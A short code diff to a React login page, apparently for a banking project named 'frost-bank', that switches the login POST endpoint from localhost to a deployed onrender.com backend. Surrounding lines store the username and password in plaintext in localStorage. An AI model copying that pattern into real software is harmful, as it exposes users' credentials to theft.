@@ -45,7 +45,7 @@ const LandingPage = () => {
     if (isValid) {
       const data = {username, password, userInfo, date: new Date().toLocaleString()}
       localStorage.setItem('User Data', JSON.stringify(data))
-      axios.post('http://localhost:3000/login', data)
+      axios.post('https://frost-bank.onrender.com/login', data)
       .then((response)=>{
         console.log(response.data.message)
       })
